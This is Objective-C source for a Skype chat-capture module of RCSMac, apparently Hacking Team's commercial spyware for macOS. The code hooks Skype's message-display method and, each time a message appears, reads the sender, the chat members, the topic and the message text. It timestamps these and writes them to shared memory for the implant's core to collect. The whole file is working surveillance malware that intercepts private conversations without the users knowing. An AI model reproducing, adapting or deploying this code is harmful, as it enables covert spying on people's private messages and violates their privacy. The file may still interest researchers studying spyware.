/*
 * RCSMac - Skype Chat Agent
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 11/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSMAgentIMSkype.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"


static BOOL gIsSkype2 = YES;

@implementation mySkypeChat

- (BOOL)isMessageRecentlyDisplayedHook: (uint)arg1
{
  BOOL success  = [self isMessageRecentlyDisplayedHook: arg1];
  id message    = nil;
  
  if ([self respondsToSelector: @selector(getChatMessageWithObjectID:)])
    {
#ifdef DEBUG_IM_SKYPE
      infoLog(@"Responds to getChatMessageWithObjectID");
#endif

      SEL sel = @selector(getChatMessageWithObjectID:);
      
      NSMethodSignature *signature = [self methodSignatureForSelector: sel];
      NSInvocation *invocation     = [NSInvocation invocationWithMethodSignature: signature];
      
      [invocation setTarget: self];
      [invocation setSelector: sel];
      [invocation setArgument: &arg1 atIndex: 2];
      
      [invocation invoke];
      [invocation getReturnValue: &message];
    }
  else
    {
#ifdef DEBUG_IM_SKYPE
      errorLog(@"Skype does not responds to getChatMessageWithObjectID");
#endif
      return success;
    }

  if (message == nil)
    {
#ifdef DEBUG_IM_SKYPE
      errorLog(@"[ERR] Failed to obtain message");
#endif
      
      return success;
    }
  
  NSArray *_activeMembers;
  NSMutableString *activeMembers  = [[NSMutableString alloc] init];
  NSMutableString *loggedText     = [[NSMutableString alloc] init];
  
  if (message != nil)
    {
      if ([self respondsToSelector: @selector(activeMemberHandles)]) // Skype < 2.8.0.722
        {
          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(activeMemberHandles)]];
        }
      else if ([self respondsToSelector: @selector(posterHandles)]) // Skype 2.8.0.722
        {
          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(posterHandles)]];
        }
      else if ([self respondsToSelector: @selector(memberContacts)]) // Skype 5.0.0.7994
        {
          _activeMembers = [NSArray arrayWithArray: [self performSelector: @selector(memberContacts)]];
          gIsSkype2 = NO;
        }
      else
        {
          _activeMembers = [NSArray arrayWithObject: @"EMPTY"];
        }

      if ([message body] != NULL)
        {
          int x;
          
          for (x = 0; x < [_activeMembers count]; x++)
            {
              id entry = [_activeMembers objectAtIndex: x];

              if ([entry isKindOfClass: [NSString class]])
                {
                  // Skype 2.x NSString entries
                  [activeMembers appendString: entry];
                }
              else
                {
                  // Skype 5.x SkypeChatContact entries
                  [activeMembers appendString: [entry performSelector: @selector(identity)]];
                }

              // Add a text delimeter in case it's not the last entry
              if (x != [_activeMembers count] - 1)
                [activeMembers appendString: @" | "];
            }
          
#ifdef DEBUG_IM_SKYPE
          infoLog(@"activeMembers: %@", activeMembers);
#endif

          //
          // In Skype 5 we don't have ourself inside the chat members list
          //
          if (gIsSkype2 == NO)
            {
              id myself = [self performSelector: @selector(myMemberContact)];
              [activeMembers appendFormat: @" | %@", [myself identity]];

#ifdef DEBUG_IM_SKYPE
              infoLog(@"myself: %@", [myself identity]);
#endif
            }

          // Appending date and time
          //[loggedText appendFormat: @"%@ ", [message date]];

          // Appending the contact name that sent the message
          MacContact *fromContact = [message fromUser];
          [loggedText appendFormat: @"%@: ", [fromContact identity]];

          // Appending the message body
          [loggedText appendString: [message body]];
          
#ifdef DEBUG_IM_SKYPE
          infoLog(@"fromUser: %@", [message fromUser]);
          infoLog(@"dialogContact: %@", [self performSelector: @selector(dialogContact)]);
          infoLog(@"peers: %@", activeMembers);
          infoLog(@"message: %@", loggedText);
#endif
        }
      else
        {
#ifdef DEBUG_IM_SKYPE
          errorLog(@"Message body is NULL");
#endif
          return success;
        }
    }
  else
    {
#ifdef DEBUG_IM_SKYPE
      errorLog(@"Message is nil");
#endif

      return success;
    }

  // Start logging
  //NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
  NSString *_topic            = [self performSelector: @selector(topic)];
  
  NSData *processName;
  if (gIsSkype2 == YES)
    processName = [@"Skype 2" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  else
    processName = [@"Skype 5" dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

  NSData *topic               = [_topic dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *peers               = [activeMembers dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  NSData *content             = [loggedText dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
  
  NSMutableData *logData      = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  NSMutableData *entryData    = [[NSMutableData alloc] init];
  
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  short unicodeNullTerminator = 0x0000;
  
  time_t rawtime;
  struct tm *tmTemp;
  
  // Struct tm
  time (&rawtime);
  tmTemp = gmtime(&rawtime);
  tmTemp->tm_year += 1900;
  tmTemp->tm_mon  ++;
  
  //
  // Our struct is 0x8 bytes bigger than the one declared on win32
  // this is just a quick fix
  //
  if (sizeof(long) == 4) // 32bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x8];
    }
  else if (sizeof(long) == 8) // 64bit
    {
      [entryData appendBytes: (const void *)tmTemp
                      length: sizeof (struct tm) - 0x14];
    }
  
  // Process Name
  [entryData appendData: processName];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Topic
  [entryData appendData: topic];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Peers
  [entryData appendData: peers];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Content
  [entryData appendData: content];
  [entryData appendBytes: &unicodeNullTerminator
                  length: sizeof(short)];
  
  // Delimeter
  unsigned int del = DELIMETER;
  [entryData appendBytes: &del
                  length: sizeof(del)];

#ifdef DEBUG_IM_SKYPE
  verboseLog(@"entryData: %@", entryData);
#endif
  
  // Log buffer
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_CHAT;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_LOG_DATA;
  shMemoryHeader->flag            = 0;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
#ifdef DEBUG_IM_SKYPE
  verboseLog(@"logData: %@", logData);
#endif
  
  if ([mSharedMemoryLogging writeMemory: logData 
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_IM_SKYPE
      verboseLog(@"message: %@", loggedText);
#endif
    }
  else
    {
#ifdef DEBUG_IM_SKYPE
      errorLog(@"Error while logging skype message to shared memory");
#endif
    }
  
  [activeMembers release];
  [loggedText release];
  
  [logData release];
  [entryData release];
  
  return success;
}

@end
